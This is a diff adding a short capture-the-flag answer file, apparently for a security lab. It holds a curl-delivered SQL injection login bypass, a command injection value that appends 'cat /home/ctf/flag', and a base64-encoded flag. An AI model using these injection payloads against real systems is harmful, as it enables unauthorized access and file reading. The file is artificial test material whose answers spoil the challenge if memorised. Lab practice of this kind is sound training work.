@@ -1,0 +1,5 @@
+FLAG1: curl -X POST -d "username=admin'--&password=''" http://141.85.224.116:8083/login.php
+FLAG2: 141.85.224.116 -c 1; cat /home/ctf/flag
+FLAG3: (Used Burp)
+FLAG4: Used an online Caesar Cipher tool
+FLAG5: echo "U1NTe2NhZ2VfdHJhdm9sdGF9Cg==" | base64 --decode
